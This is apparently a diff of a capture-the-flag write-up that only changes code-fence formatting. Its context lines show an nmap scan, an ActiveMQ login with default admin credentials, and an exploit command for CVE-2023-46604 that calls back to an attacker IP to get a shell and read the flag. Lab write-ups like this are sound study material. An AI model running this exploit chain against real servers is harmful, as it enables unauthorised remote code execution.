@@ -4,7 +4,7 @@
 </p>
 
 We are given the IP of a machine, and start with a nmap scan to identify which ports are open.
-```console
+```
 $ nmap -T 5 -p- 10.128.2.125 -sV
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-03 00:16 CET
 PORT      STATE SERVICE    VERSION
@@ -31,7 +31,7 @@ The default credentials for ActiveMQ is `admin:admin`, and we can login as admin
 This version of ActiveMQ has a deserialization vulnerability, [CVE-2023-46604](https://nvd.nist.gov/vuln/detail/cve-2023-46604), which gives attackers remote code execution.
 We can use [this POC](https://github.com/duck-sec/CVE-2023-46604-ActiveMQ-RCE-pseudoshell) to exploit the vulnerability and get shell on the server.
 
-```console
+```
 $ python3 exploit.py -i 10.128.2.125 -si <attacker_ip>
 #################################################################################
 #  CVE-2023-46604 - Apache ActiveMQ - Remote Code Execution - Pseudo Shell      #
@@ -55,7 +55,7 @@ uid=998(prime) gid=995(prime) groups=995(prime),0(root) context=system_u:system_
 ```
 
 We get shell as the user `prime`, which can read the flag from `/home/activemq/user.txt`.
-```console
+```
 Apache ActiveMQ$ cat /home/activemq/user.txt
 EPT{d41d8cd98f00b204e9800998ecf8427e}
 ```
